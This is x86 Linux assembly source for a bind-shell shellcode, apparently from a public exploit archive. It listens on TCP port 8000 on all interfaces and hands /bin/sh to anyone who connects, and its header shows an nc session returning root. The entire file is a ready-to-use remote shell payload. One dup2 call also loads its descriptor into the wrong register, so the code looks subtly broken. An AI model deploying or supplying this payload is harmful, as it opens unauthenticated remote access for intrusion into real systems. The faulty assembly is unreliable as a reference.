;
; Title	: Bind asm code Linux x86 - 179 bytes
; IP	: 0.0.0.0
; Port	: 8000
;
;
; Use	: nc localhost 8000
;	  id
;	  uid=0(root) gid=0(root) groupes=0(root)
;
;
; Author	: Jonathan Salwan
; Mail		: submit AT shell-storm.org
; Web		: http://www.shell-storm.org
;
;
; More shellcodes in => http://www.shell-storm.org/shellcode/
;


section .data
name db '/bin/sh', 0
section .text
global _start

_start:
;;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x1
push	byte	0x2

mov	eax, 	0x66
mov	ebx, 	0x1
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;

mov 	edx, 	eax

;;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x0
push	byte	0x0
push	word	0x401f
push	word	0x2
mov	ebx, 	esp

push 	byte	0x10
push	ebx
push	edx

mov	eax, 	0x66
mov	ebx, 	0x2
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;
push	byte	0x1
push	edx

mov	eax,	0x66
mov	ebx,	0x4
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x0
push	edx

mov	eax, 	0x66
mov	ebx, 	0x5
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;

mov	edx, 	eax

;;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;
mov	eax, 	0x3f
mov	ebx, 	edx
mov 	ebx, 	0x2
int	0x80

mov     eax, 	0x3f
mov     ebx, 	edx
mov     ecx, 	0x1
int     0x80

mov     eax, 	0x3f
mov     ebx, 	edx
mov     ecx, 	0x0
int     0x80
;;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Execve();;;;;;;;;;;;;;;;;;;
mov	al, 	0x0b
mov	ebx, 	name
push	byte	0x0
push	name
mov	ecx, 	esp
mov 	edx, 	0x0
int 	0x80
;;;;;;;;;;;;;;;;;;;;Execve();;;;;;;;;;;;;;;;;;;

; milw0rm.com [2009-06-01]